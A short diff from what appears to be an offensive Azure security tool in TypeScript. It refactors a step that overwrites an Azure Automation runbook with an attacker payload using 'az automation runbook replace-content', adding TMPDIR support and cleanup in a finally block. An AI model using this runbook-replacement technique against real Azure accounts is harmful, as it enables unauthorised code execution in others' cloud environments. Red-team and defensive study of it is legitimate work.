@@ -92,26 +92,30 @@ $req.GetResponse() | Out-Null
   }
 
   output.push(`[*] Replacing runbook content with payload...`)
-  const tmpFile = `/tmp/cs-runbook-${Date.now()}.ps1`
+  const tmpFile = `${process.env.TMPDIR || "/tmp"}/cs-runbook-${Date.now()}.ps1`
   await Bun.write(tmpFile, payload)
-  const replace = await az(
-    [
-      "automation",
-      "runbook",
-      "replace-content",
-      "--automation-account-name",
-      automationAccount,
-      "--resource-group",
-      resourceGroup,
-      "--name",
-      runbookName,
-      "--content",
-      `@${tmpFile}`,
-    ],
-    sub,
-    timeout,
-  )
-  await run("rm", ["-f", tmpFile], 5)
+  let replace: Awaited<ReturnType<typeof az>>
+  try {
+    replace = await az(
+      [
+        "automation",
+        "runbook",
+        "replace-content",
+        "--automation-account-name",
+        automationAccount,
+        "--resource-group",
+        resourceGroup,
+        "--name",
+        runbookName,
+        "--content",
+        `@${tmpFile}`,
+      ],
+      sub,
+      timeout,
+    )
+  } finally {
+    await run("rm", ["-f", tmpFile], 5)
+  }
   if (replace.exitCode !== 0) {
     output.push(`[-] Content replace failed: ${replace.stderr.slice(0, 200)}`)
     return { output: output.join("\n"), findings: [] }
